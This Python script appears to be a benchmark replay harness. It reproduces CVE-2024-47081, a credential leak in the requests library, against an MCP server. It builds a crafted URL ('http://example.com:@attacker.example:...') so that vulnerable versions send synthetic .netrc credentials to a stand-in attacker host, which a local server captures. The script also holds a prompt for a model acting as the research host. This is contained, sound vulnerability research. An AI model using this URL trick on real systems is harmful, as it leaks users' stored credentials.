"""Independent GH-P2-016 paired replay runner."""
from __future__ import annotations
import base64
import json
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from shared_host_runner import evidence_rows, run_shared_host_case
CASE_ID = 'GH-P2-016'
SERVER = 'rutvej/DAA'
SOURCE_COMMIT = '834699aaab8d73e9be9be4893d8e8629353b4aa9'
VULNERABLE_REQUESTS = '2.32.3'
FIXED_REQUESTS = '2.32.4'
NETRC_MACHINE = 'example.com'
NETRC_LOGIN = 'GT_P2_016_USER'
NETRC_PASSWORD = 'GT_P2_016_SECRET'
EFFECT = 'Basic ' + base64.b64encode(f"""{NETRC_LOGIN}:{NETRC_PASSWORD}""".encode()).decode()
SAFE_USERINFO = 'Basic ' + base64.b64encode(b'example.com:').decode()
BOUNDARY_MESSAGE = 'GT_P2_016_BOUNDARY_RESPONSE_MESSAGE'

class ControlledBoundary:

    def __init__(self) -> None:
        self.requests: list[dict[str, object]] = []
        self.lock = threading.Lock()
        boundary = self

        class Handler(BaseHTTPRequestHandler):

            def do_GET(self) -> None:
                headers = {str(key).lower(): str(value) for key, value in self.headers.items()}
                with boundary.lock:
                    boundary.requests.append({'method': self.command, 'path': self.path, 'headers': headers})
                reflected = headers.get('authorization', 'NO_AUTH')
                body = json.dumps([{'id': f"""{BOUNDARY_MESSAGE}:{reflected}""", 'status': 'open', 'app_name': 'GT_P2_016_BOUNDARY_RECORD', 'first_seen_at': '2026-09-25T00:00:00Z'}]).encode('utf-8')
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.send_header('Content-Length', str(len(body)))
                self.send_header('Connection', 'close')
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *_args: object) -> None:
                return
        self.server = ThreadingHTTPServer(('127.0.0.1', 0), Handler)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)

    @property
    def port(self) -> int:
        return int(self.server.server_address[1])

    def start(self) -> None:
        self.thread.start()

    def close(self) -> None:
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=3)

def main() -> int:
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('--side', choices=('vulnerable', 'fixed'), required=True)
    parser.add_argument('--repetition', type=int, choices=(1, 2, 3), required=True)
    parser.add_argument('--output', type=Path, required=True)
    args = parser.parse_args()
    boundary = ControlledBoundary()
    boundary.start()
    requests_version = VULNERABLE_REQUESTS if args.side == 'vulnerable' else FIXED_REQUESTS
    home = Path('/tmp/gt-home')
    netrc = home / '.netrc'
    home.mkdir(parents=True, exist_ok=True)
    netrc.write_text(f"""machine {NETRC_MACHINE} login {NETRC_LOGIN} password {NETRC_PASSWORD}\n""", encoding='utf-8')
    netrc.chmod(384)
    backend_url = f"""http://{NETRC_MACHINE}:@attacker.example:{boundary.port}"""
    env = {'PYTHONPATH': f"""/workspace/source/app:/opt/deps/{args.side}:/opt/deps/common""", 'PATH': '/usr/local/bin:/usr/bin:/bin', 'HOME': str(home), 'NETRC': str(netrc), 'DAA_DB_PROVIDER': 'none', 'DAA_BACKEND_API_URL': backend_url, 'DAA_TOKEN': '', 'PYTHONIOENCODING': 'utf-8', 'PYTHONWARNINGS': 'ignore', 'HTTP_PROXY': '', 'HTTPS_PROXY': '', 'ALL_PROXY': '', 'http_proxy': '', 'https_proxy': '', 'all_proxy': '', 'NO_PROXY': 'attacker.example,127.0.0.1,localhost', 'no_proxy': 'attacker.example,127.0.0.1,localhost'}
    command = ['python', '/workspace/source/app/daa_mcp_server.py']
    try:
        record = run_shared_host_case(run_id=f"""{CASE_ID}-{args.side}-{args.repetition}""", case_id=CASE_ID, revision=args.side, repetition=args.repetition, command=command, cwd=Path('/workspace/source/app'), env=env, server_name=SERVER, tool_name='get_active_incidents', tool_arguments={}, task='Call the frozen get_active_incidents Tool and report only its returned result.', system_prompt='You are a deterministic research host. Use the frozen tool call and report only its returned Tool result.', server_revision=f"""{SOURCE_COMMIT};requests=={requests_version}""", timeout=60)
        record['external_boundary'] = {'boundary': 'container-local HTTP boundary at attacker.example; Docker network none', 'request_count': len(boundary.requests), 'requests': boundary.requests, 'target_url_projection': 'http://example.com:@attacker.example:{BOUNDARY_PORT}/incidents?status=open', 'netrc_machine': NETRC_MACHINE, 'effect_rule': 'Only the synthetic .netrc-derived Authorization reflected in the serverless incident record and final get_active_incidents Tool result/L4 is the vulnerability signal; URL userinfo is the fixed baseline.'}
        record['pair_metadata'] = {'dependency': 'requests', 'vulnerable_version': VULNERABLE_REQUESTS, 'fixed_version': FIXED_REQUESTS, 'vulnerability': 'GHSA-9hjg-9r4m-mvj7 / CVE-2024-47081', 'expected_vulnerable_boundary_authorization': EFFECT, 'expected_fixed_boundary_authorization': SAFE_USERINFO, 'expected_l4_marker': BOUNDARY_MESSAGE}
        args.output.mkdir(parents=True, exist_ok=True)
        (args.output / 'host_record.json').write_text(json.dumps(record, ensure_ascii=False, indent=2) + '\n', encoding='utf-8')
        (args.output / 'evidence.jsonl').write_text(''.join((json.dumps(row, ensure_ascii=False) + '\n' for row in evidence_rows(record))), encoding='utf-8')
        valid = record['quality']['invalid_run'] is False
        print(json.dumps({'status': 'OK' if valid else 'INVALID', 'output': str(args.output), 'request_count': len(boundary.requests)}))
        return 0 if valid else 1
    finally:
        boundary.close()
if __name__ == '__main__':
    raise SystemExit(main())
